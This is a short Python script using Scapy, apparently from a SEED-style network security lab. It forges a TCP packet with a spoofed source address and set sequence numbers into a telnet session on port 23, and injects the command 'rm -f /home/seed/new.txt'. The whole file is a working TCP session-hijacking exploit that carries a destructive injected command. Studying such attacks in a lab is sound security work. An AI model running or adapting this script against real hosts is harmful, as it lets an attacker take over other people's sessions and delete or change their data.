#!/usr/bin/env python3
from scapy.all import *
ip  = IP(src="10.9.0.1", dst="10.9.0.5")
tcp = TCP(sport=54894, dport=23, flags="PA", seq=4014212077, ack=4190766443)
data = "rm -f /home/seed/new.txt\r"
pkt = ip/tcp/data
ls(pkt)
send(pkt,verbose=0)
